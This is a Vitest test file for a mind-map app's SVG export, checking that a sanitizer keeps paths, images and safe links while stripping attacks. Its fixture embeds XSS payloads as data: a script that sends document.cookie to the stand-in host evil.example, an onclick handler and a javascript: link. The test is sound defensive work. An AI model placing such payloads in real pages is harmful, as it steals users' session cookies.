// @vitest-environment jsdom
//
// End-to-end fidelity guard for the image/document export pipeline. The .svg/.png/.html/.pdf
// exports run the rendered map through sanitizeSvg (strip XSS) then inlineSvgText (foreignObject
// topic labels -> native <text>) — see useMapExports.cleanSvg. This test pins the contract on a
// fixture shaped like a real mind-elixir export so a regression in either step is caught:
//   - what must SURVIVE: topics (incl. multi-line), marker icons, node images, connector/arrow/
//     boundary geometry (<path>), and safe hyperlink URLs;
//   - what must be STRIPPED: <script>, inline event handlers, and dangerous URL schemes.
import { describe, expect, it } from "vitest";
import { sanitizeSvg } from "../src/io/svgSanitize";
import { inlineSvgText } from "../src/io/svgText";

const XHTML = 'xmlns="http://www.w3.org/1999/xhtml"';
const PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";

// A miniature SVG with the same element vocabulary mind-elixir emits, plus injected attacks.
const exportLikeSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="240">
  <g>
    <path d="M10 10 C 40 10 60 30 90 30" stroke="#e8743b" fill="none"/>
    <path d="M10 80 C 40 80 60 100 90 100" stroke="#3b82e8" fill="none"/>
    <path d="M200 20 C 260 20 300 60 340 60" stroke="#e8743b" fill="none" stroke-dasharray="6 4"/>
    <path d="M360 20 L370 20 L370 120 L360 120" stroke="#888" fill="none"/>
  </g>
  <g>
    <rect x="90" y="18" width="120" height="26" rx="6" fill="#fff"/>
    <foreignObject x="100" y="20" width="100" height="22"><div ${XHTML} style="font-size:16px;color:rgb(44,44,42);">Merchandising</div></foreignObject>
    <text x="196" y="34" font-size="14">⭐</text>
  </g>
  <g>
    <rect x="90" y="70" width="120" height="40" rx="6" fill="#3b3a4e"/>
    <foreignObject x="100" y="72" width="100" height="36"><div ${XHTML} style="font-size:16px;font-weight:700;color:#ffffff;">Autumn\ndrop</div></foreignObject>
  </g>
  <image x="230" y="80" width="20" height="20" href="${PNG}"/>
  <a href="https://example.com"><text x="240" y="140" font-size="14">link</text></a>
  <a href="javascript:alert(1)"><text x="240" y="160" font-size="14">bad</text></a>
  <rect x="0" y="0" width="5" height="5" onclick="steal()"/>
  <script>fetch('//evil.example/'+document.cookie)</script>
</svg>`;

describe("export fidelity (sanitizeSvg -> inlineSvgText)", () => {
  const out = inlineSvgText(sanitizeSvg(exportLikeSvg));

  it("converts every topic foreignObject to native <text> (none left behind)", () => {
    expect(out).not.toMatch(/foreignObject/);
    expect(out).toMatch(/<text[^>]*>Merchandising<\/text>/);
  });

  it("renders a multi-line topic as stacked <tspan> lines", () => {
    expect(out).toMatch(/<tspan[^>]*>Autumn<\/tspan>/);
    expect(out).toMatch(/<tspan[^>]*dy="[0-9.]+"[^>]*>drop<\/tspan>/);
  });

  it("keeps marker icons (native <text> emoji)", () => {
    expect(out).toContain("⭐");
  });

  it("keeps node images with their data URL", () => {
    expect(out).toMatch(/<image[\s>]/);
    expect(out).toContain("data:image/png;base64,");
  });

  it("keeps all connector / arrow / boundary geometry (<path> count unchanged)", () => {
    expect((out.match(/<path[\s>]/g) ?? []).length).toBe(4);
  });

  it("keeps a safe hyperlink URL", () => {
    expect(out).toContain("https://example.com");
  });

  it("strips scripts, inline event handlers, and dangerous URL schemes", () => {
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/onclick/i);
    expect(out.toLowerCase()).not.toContain("javascript:");
  });
});
